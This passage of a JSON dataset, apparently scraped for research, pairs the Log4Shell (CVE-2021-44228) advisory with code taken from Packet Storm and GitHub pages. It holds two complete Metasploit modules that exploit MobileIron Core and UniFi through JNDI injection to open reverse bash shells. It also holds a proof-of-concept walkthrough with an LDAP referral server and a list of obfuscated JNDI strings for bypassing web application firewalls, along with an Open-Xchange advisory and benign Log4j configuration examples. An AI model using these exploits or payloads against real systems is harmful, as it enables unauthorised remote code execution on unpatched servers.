    "successful_fetch": 1,
    "title": "VMware vCenter Server Unauthenticated Log4Shell JNDI Injection Remote Code Execution ≈ Packet Storm",
    "url": "http://packetstormsecurity.com/files/165642/VMware-vCenter-Server-Unauthenticated-Log4Shell-JNDI-Injection-Remote-Code-Execution.html",
    "vulnerability_id": "GHSA-jfh8-c2jp-5v3q"
  },
  {
    "vuln_description": "Apache Log4j2 2.0-beta9 through 2.15.0 (excluding security releases 2.12.2, 2.12.3, and 2.3.1) JNDI features used in configuration, log messages, and parameters do not protect against attacker controlled LDAP and other JNDI related endpoints. An attacker who can control log messages or log message parameters can execute arbitrary code loaded from LDAP servers when message lookup substitution is enabled. From log4j 2.15.0, this behavior has been disabled by default. From version 2.16.0 (along with 2.12.2, 2.12.3, and 2.3.1), this functionality has been completely removed. Note that this vulnerability is specific to log4j-core and does not affect log4net, log4cxx, or other Apache Logging Services projects.",
    "code": [
      {
        "code": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::Log4Shell\n  include Msf::Exploit::Remote::HttpClient\n  prepend Msf::Exploit::Remote::AutoCheck\n\n  def initialize(_info = {})\n    super(\n      'Name' => 'MobileIron Core Unauthenticated JNDI Injection RCE (via Log4Shell)',\n      'Description' => %q{\n        MobileIron Core is affected by the Log4Shell vulnerability whereby a JNDI string sent to the server\n        will cause it to connect to the attacker and deserialize a malicious Java object. This results in OS\n        command execution in the context of the tomcat user.\n\n        This module will start an LDAP server that the target will need to connect to.\n      },\n      'Author' => [\n        'Spencer McIntyre', # JNDI/LDAP lib stuff\n        'RageLtMan <rageltman[at]sempervictus>', # JNDI/LDAP lib stuff\n        'rwincey', # discovered log4shell vector in MobileIron\n        'jbaines-r7' # wrote this module\n      ],\n      'References' => [\n        [ 'CVE', '2021-44228' ],\n        [ 'URL', 'https://attackerkb.com/topics/in9sPR2Bzt/cve-2021-44228-log4shell/rapid7-analysis'],\n        [ 'URL', 'https://forums.ivanti.com/s/article/Security-Bulletin-CVE-2021-44228-Remote-code-injection-in-Log4j?language=en_US' ],\n        [ 'URL', 'https://www.mandiant.com/resources/mobileiron-log4shell-exploitation' ]\n      ],\n      'DisclosureDate' => '2021-12-12',\n      'License' => MSF_LICENSE,\n      'DefaultOptions' => {\n        'RPORT' => 443,\n        'SSL' => true,\n        'SRVPORT' => 389,\n        'WfsDelay' => 30\n      },\n      'Targets' => [\n        [\n          'Linux', {\n            'Platform' => 'unix',\n            'Arch' => [ARCH_CMD],\n            'DefaultOptions' => {\n              'PAYLOAD' => 'cmd/unix/reverse_bash'\n            }\n          },\n        ]\n      ],\n      'Notes' => {\n        'Stability' => [CRASH_SAFE],\n        'SideEffects' => [IOC_IN_LOGS],\n        'AKA' => ['Log4Shell', 'LogJam'],\n        'Reliability' => [REPEATABLE_SESSION],\n        'RelatedModules' => [\n          'auxiliary/scanner/http/log4shell_scanner',\n          'exploit/multi/http/log4shell_header_injection'\n        ]\n      }\n    )\n    register_options([\n      OptString.new('TARGETURI', [ true, 'Base path', '/'])\n    ])\n  end\n\n  def wait_until(&block)\n    datastore['WfsDelay'].times do\n      break if block.call\n\n      sleep(1)\n    end\n  end\n\n  def check\n    validate_configuration!\n\n    vprint_status('Attempting to trigger the jndi callback...')\n\n    start_service\n    res = trigger\n    return Exploit::CheckCode::Unknown('No HTTP response was received.') if res.nil?\n\n    wait_until { @search_received }\n    @search_received ? Exploit::CheckCode::Vulnerable : Exploit::CheckCode::Unknown('No LDAP search query was received.')\n  ensure\n    cleanup_service\n  end\n\n  def build_ldap_search_response_payload\n    return [] if @search_received\n\n    @search_received = true\n\n    return [] unless @exploiting\n\n    print_good('Delivering the serialized Java object to execute the payload...')\n    build_ldap_search_response_payload_inline('CommonsBeanutils1')\n  end\n\n  def trigger\n    @search_received = false\n\n    send_request_cgi(\n      'method' => 'POST',\n      'uri' => normalize_uri(target_uri, 'mifs', 'j_spring_security_check'),\n      'headers' => {\n        'Referer' => \"https://#{rhost}#{normalize_uri(target_uri, 'mifs', 'user', 'login.jsp')}\"\n      },\n      'encode' => false,\n      'vars_post' => {\n        'j_username' => log4j_jndi_string,\n        'j_password' => Rex::Text.rand_text_alphanumeric(8),\n        'logincontext' => 'employee'\n      }\n    )\n  end\n\n  def exploit\n    validate_configuration!\n    @exploiting = true\n    start_service\n    res = trigger\n    fail_with(Failure::Unreachable, 'Failed to trigger the vulnerability') if res.nil?\n    fail_with(Failure::UnexpectedReply, 'The server replied to the trigger in an unexpected way') unless res.code == 302\n\n    wait_until { @search_received && (!handler_enabled? || session_created?) }\n    handler\n  end\nend\n",
        "preamble": "Change Mirror\nDownload"
      }
    ],
    "content_type": "text/html",
    "successful_fetch": 1,
    "title": "MobileIron Log4Shell Remote Command Execution ≈ Packet Storm",
    "url": "http://packetstormsecurity.com/files/167917/MobileIron-Log4Shell-Remote-Command-Execution.html",
    "vulnerability_id": "GHSA-jfh8-c2jp-5v3q"
  },
  {
    "vuln_description": "Apache Log4j2 2.0-beta9 through 2.15.0 (excluding security releases 2.12.2, 2.12.3, and 2.3.1) JNDI features used in configuration, log messages, and parameters do not protect against attacker controlled LDAP and other JNDI related endpoints. An attacker who can control log messages or log message parameters can execute arbitrary code loaded from LDAP servers when message lookup substitution is enabled. From log4j 2.15.0, this behavior has been disabled by default. From version 2.16.0 (along with 2.12.2, 2.12.3, and 2.3.1), this functionality has been completely removed. Note that this vulnerability is specific to log4j-core and does not affect log4net, log4cxx, or other Apache Logging Services projects.",
    "code": [
      {
        "code": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::JndiInjection\n  include Msf::Exploit::Remote::HttpClient\n  prepend Msf::Exploit::Remote::AutoCheck\n\n  def initialize(_info = {})\n    super(\n      'Name' => 'UniFi Network Application Unauthenticated JNDI Injection RCE (via Log4Shell)',\n      'Description' => %q{\n        The Ubiquiti UniFi Network Application versions 5.13.29 through 6.5.53 are affected by the Log4Shell\n        vulnerability whereby a JNDI string can be sent to the server via the 'remember' field of a POST request to the\n        /api/login endpoint that will cause the server to connect to the attacker and deserialize a malicious Java\n        object. This results in OS command execution in the context of the server application.\n\n        This module will start an LDAP server that the target will need to connect to.\n      },\n      'Author' => [\n        'Spencer McIntyre', # this exploit module and JNDI/LDAP lib stuff\n        'RageLtMan <rageltman[at]sempervictus>', # JNDI/LDAP lib stuff\n        'Nicholas Anastasi' # Unifi research\n      ],\n      'References' => [\n        [ 'CVE', '2021-44228' ],\n        [ 'URL', 'https://www.sprocketsecurity.com/blog/another-log4j-on-the-fire-unifi' ],\n        [ 'URL', 'https://github.com/puzzlepeaches/Log4jUnifi' ],\n        [ 'URL', 'https://community.ui.com/releases/UniFi-Network-Application-6-5-54/d717f241-48bb-4979-8b10-99db36ddabe1' ]\n      ],\n      'DisclosureDate' => '2021-12-09',\n      'License' => MSF_LICENSE,\n      'DefaultOptions' => {\n        'RPORT' => 8443,\n        'SSL' => true,\n        'WfsDelay' => 30\n      },\n      'DefaultTarget' => 1,\n      'Targets' => [\n        [\n          'Windows', {\n            'Platform' => 'win'\n          },\n        ],\n        [\n          'Unix', {\n            'Platform' => 'unix',\n            'Arch' => [ARCH_CMD],\n            'DefaultOptions' => {\n              'PAYLOAD' => 'cmd/unix/reverse_bash'\n            }\n          },\n        ]\n      ],\n      'Notes' => {\n        'Stability' => [CRASH_SAFE],\n        'SideEffects' => [IOC_IN_LOGS],\n        'AKA' => ['Log4Shell', 'LogJam'],\n        'Reliability' => [REPEATABLE_SESSION]\n      }\n    )\n    register_options([\n      OptString.new('TARGETURI', [ true, 'Base path', '/'])\n    ])\n  end\n\n  def wait_until(&block)\n    datastore['WfsDelay'].times do\n      break if block.call\n\n      sleep(1)\n    end\n  end\n\n  def check\n    validate_configuration!\n    res = send_request_cgi('uri' => normalize_uri(target_uri, 'status'))\n    return Exploit::CheckCode::Unknown('No HTTP response was received.') if res.nil?\n\n    server_version = res.get_json_document.dig('meta', 'server_version')\n    return Exploit::CheckCode::Safe('The target service does not appear to be running.') unless server_version =~ /(\\d+\\.)+/\n\n    vprint_status(\"Detected version: #{server_version}\")\n    server_version = Rex::Version.new(server_version)\n    if server_version < Rex::Version.new('5.13.29')\n      return Exploit::CheckCode::Safe('Versions prior to 5.13.29 are not exploitable.')\n    elsif server_version > Rex::Version.new('6.5.53')\n      return Exploit::CheckCode::Safe('Versions after 6.5.53 are patched and not affected.')\n    end\n\n    vprint_status('The target appears to be a vulnerable version, attempting to trigger the vulnerability...')\n\n    start_service\n    res = trigger\n    return Exploit::CheckCode::Unknown('No HTTP response was received.') if res.nil?\n\n    wait_until { @search_received }\n    @search_received ? Exploit::CheckCode::Vulnerable : Exploit::CheckCode::Unknown('No LDAP search query was received.')\n  ensure\n    stop_service\n  end\n\n  def build_ldap_search_response_payload\n    return [] if @search_received\n\n    @search_received = true\n\n    return [] unless @exploiting\n\n    print_good('Delivering the serialized Java object to execute the payload...')\n    build_ldap_search_response_payload_inline('BeanFactory')\n  end\n\n  def trigger\n    @search_received = false\n    # HTTP request initiator\n    send_request_cgi(\n      'uri' => normalize_uri(target_uri, 'api', 'login'),\n      'method' => 'POST',\n      'ctype' => 'application/json',\n      'data' => {\n        'username' => rand_text_alphanumeric(8..16), # can not be blank!,\n        'password' => rand_text_alphanumeric(8..16), # can not be blank!\n        'remember' => jndi_string,\n        'strict' => true\n      }.to_json\n    )\n  end\n\n  def exploit\n    validate_configuration!\n\n    @exploiting = true\n    start_service\n    res = trigger\n    fail_with(Failure::Unreachable, 'Failed to trigger the vulnerability') if res.nil?\n\n    msg = res.get_json_document.dig('meta', 'msg')\n    if res.code == 400 && msg == 'api.err.Invalid' # returned by versions before 5.13.29\n      fail_with(Failure::NotVulnerable, 'The target is not vulnerable')\n    end\n\n    unless res.code == 400 && msg == 'api.err.InvalidPayload' # returned by versions after 5.13.29 (including patched ones)\n      fail_with(Failure::UnexpectedReply, 'The server replied to the trigger in an unexpected way')\n    end\n\n    wait_until { @search_received && (!handler_enabled? || session_created?) }\n    handler\n  ensure\n    cleanup\n  end\nend\n",
        "preamble": "Change Mirror\nDownload"
      }
    ],
    "content_type": "text/html",
    "successful_fetch": 1,
    "title": "UniFi Network Application Unauthenticated Log4Shell Remote Code Execution ≈ Packet Storm",
    "url": "http://packetstormsecurity.com/files/165673/UniFi-Network-Application-Unauthenticated-Log4Shell-Remote-Code-Execution.html",
    "vulnerability_id": "GHSA-jfh8-c2jp-5v3q"
  },
  {
    "vuln_description": "Apache Log4j2 2.0-beta9 through 2.15.0 (excluding security releases 2.12.2, 2.12.3, and 2.3.1) JNDI features used in configuration, log messages, and parameters do not protect against attacker controlled LDAP and other JNDI related endpoints. An attacker who can control log messages or log message parameters can execute arbitrary code loaded from LDAP servers when message lookup substitution is enabled. From log4j 2.15.0, this behavior has been disabled by default. From version 2.16.0 (along with 2.12.2, 2.12.3, and 2.3.1), this functionality has been completely removed. Note that this vulnerability is specific to log4j-core and does not affect log4net, log4cxx, or other Apache Logging Services projects.",
    "code": [
      {
        "code": "Product: OX App Suite\nVendor: OX Software GmbH\n\n\n\nInternal reference: DOCS-4106\nVulnerability type: OS Command Injection (CWE-78)\nVulnerable version: 7.10.6 and earlier\nVulnerable component: documentconverter\nReport confidence: Confirmed\nSolution status: Fixed by Vendor\nFixed version: 7.8.4-rev13, 7.10.3-rev6, 7.10.4-rev6, 7.10.5-rev5, 7.10.6-rev3\nVendor notification: 2022-01-10\nSolution date: 2022-01-13\nPublic disclosure: 2022-07-21\nCVE reference: CVE-2022-23100\nCVSS: 8.2 (CVSS:3.1/AV:A/AC:H/PR:N/UI:N/S:C/C:H/I:H/A:L)\n\nVulnerability Details:\nOX Documentconverter has a Remote Code Execution flaw that allows authenticated OX App Suite users to run commands on the instance which runs OX Documentconverter if they have the ability to perform document conversions, for example of E-Mail attachments or OX Drive content.\n\nRisk:\nAttackers can inject arbitrary operating-system level commands via OX App Suite API and/or OX Documentconverter API. Commands are executed on the instance running OX Documentconverter, based on \"open-xchange\" user privileges. This can be used to modify or exfiltrate configuration files as well as adversely affect the instances availability by excessive resource usage. By default the vulnerable Documentconverter API is not publicly accessible, however this might be worked around by abusing other weaknesses, configuration flaws or social engineering.\n\nSteps to reproduce:\n1. Create a forged Documentconverter API call that embeds escape characters and a system command\n2. Inject the malicious API call via App Suite as a proxy or other means\n\nSolution:\nWe reduceed available API parameters to a limited set of enumerations, rather than accepting API input.\n\n\n\n---\n\n\n\nInternal reference: MWB-1350\nVulnerability type: Cross-Site Scripting (CWE-80)\nVulnerable version: 7.10.6 and earlier\nVulnerable component: backend\nReport confidence: Confirmed\nSolution status: Fixed by Vendor\nFixed version: 7.8.4-rev78, 7.10.3-rev38, 7.10.4-rev31, 7.10.5-rev37, 7.10.6-rev9\nVendor notification: 2021-11-30\nSolution date: 2022-02-15\nPublic disclosure: 2022-07-21\nCVE reference: CVE-2022-23099\nCVSS: 3.5 (CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:U/C:L/I:N/A:N)\n\nVulnerability Details:\nExisting sanitization and filtering mechanisms for HTML files can be bypassed by forcing block-wise read. Using this technique, the recognition procedure misses to detect tags and attributes that span multiple blocks.\n\nRisk:\nMalicious script code can be executed within a users context. This can lead to session hijacking or triggering unwanted actions via the web interface (e.g. redirecting to a third-party site). To exploit this an attacker would require the victim to follow a hyperlink.\n\nSteps to reproduce:\n1. As attacker, create a HTML malicious code-snippet which masks tags (e.g. <script>) by block boundaries\n2. Upload the code snippet to drive and create a sharing link\n3. Sent that link to a victim and make it follow it\n\nSolution:\nWe now check for possible HTML content through overlapping reads from data streams.\n\n\n\n---\n\n\n\nInternal reference: MWB-1366\nVulnerability type: n/a\nVulnerable version: 7.10.6 and earlier\nVulnerable component: middleware\nReport confidence: Confirmed\nSolution status: Fixed by Vendor\nFixed version: 7.8.4-rev78, 7.10.3-rev38, 7.10.4-rev31, 7.10.5-rev38, 7.10.6-rev9\nVendor notification: 2021-12-10\nSolution date: 2022-02-15\nPublic disclosure: 2022-07-21\nCVE reference: CVE-2021-42550\nCVSS: n/a\n\nVulnerability Details:\nIn the wake of the CVE-2021-44228 (Log4Shell) issue, a similar potential vulnerability at the Logback library has been identified (LOGBACK-1591, CVE-2021-42550). At its default configuration, OX App Suite is not susceptible to this vulnerability and there are no scenarios that require to deploy a vulnerable configuration.\n\nRisk:\nWe provide this update strictly as a precaution to mitigate the possibility of a vulnerability. Exploiting CVE-2021-42550 at this point would require privileged access to alter system configuration.\n\nSteps to reproduce:\n1. n/a\n\nSolution:\nWe provided a component update to Logback 1.2.8 and slf4j 1.7.32.\n\n\n\n---\n\n\n\nInternal reference: OXUIB-1172\nVulnerability type: Cross-Site Scripting (CWE-80)\nVulnerable version: 7.10.5 and earlier\nVulnerable component: frontend\nReport confidence: Confirmed\nSolution status: Fixed by Vendor\nFixed version: 7.8.4-rev69, 7.10.3-rev31, 7.10.4-rev28, 7.10.5-rev30\nVendor notification: 2021-11-30\nSolution date: 2022-02-15\nPublic disclosure: 2022-07-21\nCVE reference: CVE-2022-23101\nCVSS: 4.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:N/A:N)\n\nVulnerability Details:\nDeep-links within E-Mail (e.g. links to Drive files) are not checked for malicious use of the appHandler function (see CVE-2021-38374) and may therefore be used to inject references to malicious code.\n\nRisk:\nMalicious script code can be executed within a users context. This can lead to session hijacking or triggering unwanted actions via the web interface (e.g. redirecting to a third-party site). To exploit this an attacker would require to forge App Suite specific mails and force the victim to follow a hyperlink.\n\nSteps to reproduce:\n1. As an attacker, create a malicious E-Mail that uses App Suite \"Deep-links\" as mail header and embed a call to the AppLoader component\n2. Deliver the mail and make the victim open the link\n\nProof of concept:\nX-Open-Xchange-Share-URL: https://example.com/#!!&app=%2e./%2e./%2e./%2e./%2e./%2e./appsuite/drive/script.js?cut=&id=123\n\nSolution:\nWe now check for a enumeration of valid applications for deep-links as well.\n\n\n\n---\n\n\n\nInternal reference: DOCS-4161\nVulnerability type: OS Command Injection (CWE-78)\nVulnerable version: 7.10.6 and earlier\nVulnerable component: documentconverter\nReport confidence: Confirmed\nSolution status: Fixed by Vendor\nFixed version: 7.8.4-rev14, 7.10.3-rev7, 7.10.4-rev7, 7.10.5-rev6, 7.10.6-rev3\nVendor notification: 2022-01-24\nSolution date: 2022-02-15\nPublic disclosure: 2022-07-21\nCVE reference: CVE-2022-24405\nCVSS: 7.3 (CVSS:3.1/AV:A/AC:H/PR:H/UI:N/S:C/C:H/I:H/A:N)\n\nVulnerability Details:\nThe compatibility layer of documentconverter API processes serialized Java classes when using remote cache calls. This can be exploited to inject malicious code that is being executed in the context of the documentconverter component.\n\nRisk:\nAttackers can inject arbitrary operating-system level commands via the OX Documentconverter API. Commands are executed on the instance running OX Documentconverter, based on \"open-xchange\" user privileges. This can be used to modify or exfiltrate configuration files as well as adversely affect the instances availability by excessive resource usage. By default the vulnerable OX Documentconverter API is not publicly accessible and we are not aware that this could have been exploited without privileged network or system access.\n\nSteps to reproduce:\n1. Create a malicious Java class and serialize it\n2. Use the OX Documentconverter API to inject this class as a reference/hash to remote caches\n\nSolution:\nWe now apply input sanitization to this API call and retrict it to strings. We also implemented a set of additional hardening procedures for other API calls which work in a similar way.\n\n\n\n---\n\n\n\nInternal reference: DOCS-4120\nVulnerability type: Server-Side Request Forgery (CWE-918)\nVulnerable version: 7.10.6 and earlier\nVulnerable component: documentconverter-api\nReport confidence: Confirmed\nSolution status: Fixed by Vendor\nFixed version: 7.8.4-rev10, 7.10.3-rev5, 7.10.4-rev6, 7.10.5-rev6, 7.10.6-rev3\nVendor notification: 2022-01-10\nSolution date: 2022-02-15\nPublic disclosure: 2022-07-21\nCVE reference: CVE-2022-24406\nCVSS: 6.4 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:L/I:L/A:N)\n\nVulnerability Details:\nBy creating colissions of HTTP multipart-formdata boundaries it is possible to alter the API request parameters between OX App Suite and OX Documentconverter. Legitimate multipart-formdata boundaries are created based on a timestamp with millisecond resolution. This allows attackers to predict the next boundary and attempt to overwrite its content. The most practical way to exploit this is sending a large number of formdata parts, each with a unique boundary based on a future point in time.\n\nRisk:\nAttackers can modify parameters of internal API calls to OX Documentconverter and by that circumvent network trust boundaries. In effect, a server-side request forgery attack is possible, for example to exploit DOCS-4106 (CVE-2022-23100) with limited privileges using OX App Suite API as a \"proxy\".\n\nSteps to reproduce:\n1. Create a HTTP request with multipart-formdata boundaries representing timestamps in the near future\n2. Add internal API parameters to those multipart-formdata sections and use them as requests to OX App Suite API\n\nSolution:\nWe modified the algorithm to create multipart-formdata boundaries in a way that they are no longer predictable. We also restricted the number of multipart-formdata parts to a sensible amount and issue an Exception if a client exceeds it.\n",
        "preamble": "Change Mirror\nDownload"
      }
    ],
    "content_type": "text/html",
    "successful_fetch": 1,
    "title": "Open-Xchange App Suite 7.10.x Cross Site Scripting / Command Injection ≈ Packet Storm",
    "url": "http://packetstormsecurity.com/files/167794/Open-Xchange-App-Suite-7.10.x-Cross-Site-Scripting-Command-Injection.html",
    "vulnerability_id": "GHSA-jfh8-c2jp-5v3q"
  },
  {
    "vuln_description": "Apache Log4j2 2.0-beta9 through 2.15.0 (excluding security releases 2.12.2, 2.12.3, and 2.3.1) JNDI features used in configuration, log messages, and parameters do not protect against attacker controlled LDAP and other JNDI related endpoints. An attacker who can control log messages or log message parameters can execute arbitrary code loaded from LDAP servers when message lookup substitution is enabled. From log4j 2.15.0, this behavior has been disabled by default. From version 2.16.0 (along with 2.12.2, 2.12.3, and 2.3.1), this functionality has been completely removed. Note that this vulnerability is specific to log4j-core and does not affect log4net, log4cxx, or other Apache Logging Services projects.",
    "code": [
      {
        "code": "cd vuln_app/CVE-2021-44228-VULN-APP/\ndocker build -t log4j-shell-poc .\ndocker run --network host log4j-shell-poc\n",
        "preamble": "Docker vulnerable app:"
      }
    ],
    "content_type": "text/html",
    "successful_fetch": 1,
    "title": "CVE-mitre/CVE-2021-44228 at main · nu11secur1ty/CVE-mitre · GitHub",
    "url": "https://github.com/nu11secur1ty/CVE-mitre/tree/main/CVE-2021-44228",
    "vulnerability_id": "GHSA-jfh8-c2jp-5v3q"
  },
  {
    "vuln_description": "Apache Log4j2 2.0-beta9 through 2.15.0 (excluding security releases 2.12.2, 2.12.3, and 2.3.1) JNDI features used in configuration, log messages, and parameters do not protect against attacker controlled LDAP and other JNDI related endpoints. An attacker who can control log messages or log message parameters can execute arbitrary code loaded from LDAP servers when message lookup substitution is enabled. From log4j 2.15.0, this behavior has been disabled by default. From version 2.16.0 (along with 2.12.2, 2.12.3, and 2.3.1), this functionality has been completely removed. Note that this vulnerability is specific to log4j-core and does not affect log4net, log4cxx, or other Apache Logging Services projects.",
    "code": [
      {
        "code": "git clone https://github.com/tangxiaofeng7/CVE-2021-44228-Apache-Log4j-Rce.git\ncd CVE-2021-44228-Apache-Log4j-Rce\n\njavac Exploit.java\n\n# start webserver\n# For Python2\npython -m SimpleHTTPServer 8888\n# For Python3\npython3 -m http.server 8888\n\n# make sure python webserver is running the same directory as Exploit.class, to test\n  curl -I 127.0.0.1:8888/Exploit.class\n",
        "preamble": "download this project, compile the exploit code blob/master/src/main/java/Exploit.java, and start a webserver allowing downloading the compiled binary."
      },
      {
        "code": "git clone https://github.com/mbechler/marshalsec.git\ncd marshalsec\n# Java 8 required\nmvn clean package -DskipTests\njava -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer \"http://127.0.0.1:8888/#Exploit\"\n",
        "preamble": "download another project and run LDAP server implementation returning JNDI references https://github.com/mbechler/marshalsec/blob/master/src/main/java/marshalsec/jndi/LDAPRefServer.java"
      },
      {
        "code": "cd CVE-2021-44228-Apache-Log4j-Rce\nmvn clean package\njava -cp target/log4j-rce-1.0-SNAPSHOT-all.jar log4j\n\n# expect the following\n# 1. calculator app appear\n# 2. in ldapserver console,\n#  Send LDAP reference result for Exploit redirecting to http://127.0.0.1:8888/Exploit.class\n# 3. in webserver console,\n#  127.0.0.1 - - [....] \"GET /Exploit.class HTTP/1.1\" 200 -\n\n\n",
        "preamble": "build and run the activation code (simulate an log4j attack on a vulnerable java web server) blob/master/src/main/java/log4j.java, and your calculator app will appear."
      },
      {
        "code": "${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://asdasd.asdasd.asdasd/poc}\n${${::-j}ndi:rmi://asdasd.asdasd.asdasd/ass}\n${jndi:rmi://adsasd.asdasd.asdasd}\n${${lower:jndi}:${lower:rmi}://adsasd.asdasd.asdasd/poc}\n${${lower:${lower:jndi}}:${lower:rmi}://adsasd.asdasd.asdasd/poc}\n${${lower:j}${lower:n}${lower:d}i:${lower:rmi}://adsasd.asdasd.asdasd/poc}\n${${lower:j}${upper:n}${lower:d}${upper:i}:${lower:r}m${lower:i}}://xxxxxxx.xx/poc}\n",
        "preamble": "Bypass WAF"
      }
    ],
    "content_type": "text/html",
    "successful_fetch": 1,
    "title": "GitHub - tangxiaofeng7/CVE-2021-44228-Apache-Log4j-Rce: Apache Log4j 远程代码执行",
    "url": "https://github.com/tangxiaofeng7/apache-log4j-poc",
    "vulnerability_id": "GHSA-jfh8-c2jp-5v3q"
  },
  {
    "vuln_description": "Apache Log4j2 2.0-beta9 through 2.15.0 (excluding security releases 2.12.2, 2.12.3, and 2.3.1) JNDI features used in configuration, log messages, and parameters do not protect against attacker controlled LDAP and other JNDI related endpoints. An attacker who can control log messages or log message parameters can execute arbitrary code loaded from LDAP servers when message lookup substitution is enabled. From log4j 2.15.0, this behavior has been disabled by default. From version 2.16.0 (along with 2.12.2, 2.12.3, and 2.3.1), this functionality has been completely removed. Note that this vulnerability is specific to log4j-core and does not affect log4net, log4cxx, or other Apache Logging Services projects.",
    "code": [
      {
        "code": "<!DOCTYPE log4j:configuration PUBLIC \"-//APACHE//DTD LOG4J 1.2//EN\" \"log4j.dtd\">\r<log4j:configuration xmlns:log4j='http://jakarta.apache.org/log4j/'>\r  <appender name=\"STDOUT\" class=\"org.apache.log4j.ConsoleAppender\">\r    <layout class=\"org.apache.log4j.PatternLayout\">\r      <param name=\"ConversionPattern\" value=\"%d %-5p [%t] %C{2} (%F:%L) - %m%n\"/>\r    </layout>\r  </appender>\r  <category name=\"org.apache.log4j.xml\">\r    <priority value=\"info\" />\r  </category>\r  <Root>\r    <priority value =\"debug\" />\r    <appender-ref ref=\"STDOUT\" />\r  </Root>\r</log4j:configuration>",
        "preamble": "Log4j 1.x XML configuration"
      },
      {
        "code": "<Configuration>\r  <Appenders>\r    <Console name=\"STDOUT\" target=\"SYSTEM_OUT\">\r      <PatternLayout pattern=\"%d %-5p [%t] %C{2} (%F:%L) - %m%n\"/>\r    </Console>\r  </Appenders>\r  <Loggers>\r    <Logger name=\"org.apache.log4j.xml\" level=\"info\"/>\r    <Root level=\"debug\">\r      <AppenderRef ref=\"STDOUT\"/>\r    </Root>\r  </Loggers>\r</Configuration>",
        "preamble": "Log4j 2 XML configuration"
      },
      {
        "code": "<!DOCTYPE log4j:configuration PUBLIC \"-//APACHE//DTD LOG4J 1.2//EN\" \"log4j.dtd\">\r<log4j:configuration xmlns:log4j=\"http://jakarta.apache.org/log4j/\">\r  <appender name=\"A1\" class=\"org.apache.log4j.FileAppender\">\r    <param name=\"File\"   value=\"A1.log\" />\r    <param name=\"Append\" value=\"false\" />\r    <layout class=\"org.apache.log4j.xml.XMLLayout\" />\r  </appender>\r  <appender name=\"STDOUT\" class=\"org.apache.log4j.ConsoleAppender\">\r    <layout class=\"org.apache.log4j.SimpleLayout\" />\r  </appender>\r  <category name=\"org.apache.log4j.xml\">\r    <priority value=\"debug\" />\r    <appender-ref ref=\"A1\" />\r  </category>\r  <root>\r    <priority value =\"debug\" />\r    <appender-ref ref=\"STDOUT\" />\r  </Root>\r</log4j:configuration>",
        "preamble": "Log4j 1.x XML configuration"
      },
      {
        "code": "<Configuration>\r  <Appenders>\r    <File name=\"A1\" fileName=\"A1.log\" append=\"false\">\r      <Log4j1XmlLayout />\r    </File>\r    <Console name=\"STDOUT\" target=\"SYSTEM_OUT\">\r      <PatternLayout pattern=\"%level - %m%n\"/>\r    </Console>\r  </Appenders>\r  <Loggers>\r    <Logger name=\"org.apache.log4j.xml\" level=\"debug\">\r      <AppenderRef ref=\"A1\"/>\r    </Logger>\r    <Root level=\"debug\">\r      <AppenderRef ref=\"STDOUT\"/>\r    </Root>\r  </Loggers>\r</Configuration>",
        "preamble": "Log4j 2 XML configuration"
      },
      {
        "code": "<!DOCTYPE log4j:configuration PUBLIC \"-//APACHE//DTD LOG4J 1.2//EN\" \"log4j.dtd\">\r<log4j:configuration xmlns:log4j=\"http://jakarta.apache.org/log4j/\">\r  <appender name=\"A1\" class=\"org.apache.log4j.net.SocketAppender\">\r    <param name=\"RemoteHost\" value=\"localhost\"/>\r    <param name=\"Port\" value=\"5000\"/>\r    <param name=\"LocationInfo\" value=\"true\"/>\r    <layout class=\"org.apache.log4j.PatternLayout\">\r      <param name=\"ConversionPattern\" value=\"%t %-5p %c{2} - %m%n\"/>\r    </layout>\r  </appender>\r  <appender name=\"STDOUT\" class=\"org.apache.log4j.ConsoleAppender\">\r    <layout class=\"org.apache.log4j.PatternLayout\">\r      <param name=\"ConversionPattern\" value=\"%d %-5p [%t] %C{2} (%F:%L) - %m%n\"/>\r    </layout>\r  </appender>\r  <category name=\"org.apache.log4j.xml\">\r    <priority value=\"debug\"/>\r    <appender-ref ref=\"A1\"/>\r  </category>\r  <root>\r    <priority value=\"debug\"/>\r    <appender-ref ref=\"STDOUT\"/>\r  </Root>\r</log4j:configuration>",
        "preamble": "Log4j 1.x XML configuration. This example from Log4j 1.x is misleading. The SocketAppender does not actually use a Layout. Configuring one will have no effect."
      },
      {
        "code": "<Configuration>\r  <Appenders>\r    <Socket name=\"A1\" host=\"localHost\" port=\"5000\">\r      <PatternLayout pattern=\"%t %-5p %c{2} - %m%n\"/>\r    </Socket>\r    <Console name=\"STDOUT\" target=\"SYSTEM_OUT\">\r      <PatternLayout pattern=\"%d %-5p [%t] %C{2} (%F:%L) - %m%n\"/>\r    </Console>\r  </Appenders>\r  <Loggers>\r    <Logger name=\"org.apache.log4j.xml\" level=\"debug\">\r      <AppenderRef ref=\"A1\"/>\r    </Logger>\r    <Root level=\"debug\">\r      <AppenderRef ref=\"STDOUT\"/>\r    </Root>\r  </Loggers>\r</Configuration>",
        "preamble": "Log4j 2 XML configuration"
      },
      {
        "code": "<!DOCTYPE log4j:configuration PUBLIC \"-//APACHE//DTD LOG4J 1.2//EN\" \"log4j.dtd\">\r<log4j:configuration xmlns:log4j=\"http://jakarta.apache.org/log4j/\" configDebug=\"true\">\r  <appender name=\"ASYNC\" class=\"org.apache.log4j.AsyncAppender\">\r    <appender-ref ref=\"TEMP\"/>\r  </appender>\r  <appender name=\"TEMP\" class=\"org.apache.log4j.FileAppender\">\r    <param name=\"File\" value=\"temp\"/>\r    <layout class=\"org.apache.log4j.TTCCLayout\">\r      <param name=\"ThreadPrinting\" value=\"true\"/>\r      <param name=\"CategoryPrefixing\" value=\"true\"/>\r      <param name=\"ContextPrinting\" value=\"true\"/>\r    </layout>\r  </appender>\r  <root>\r    <priority value=\"debug\"/>\r    <appender-ref ref=\"ASYNC\"/>\r  </Root>\r</log4j:configuration>",
        "preamble": "Log4j 1.x XML configuration using the AsyncAppender."
      },
      {
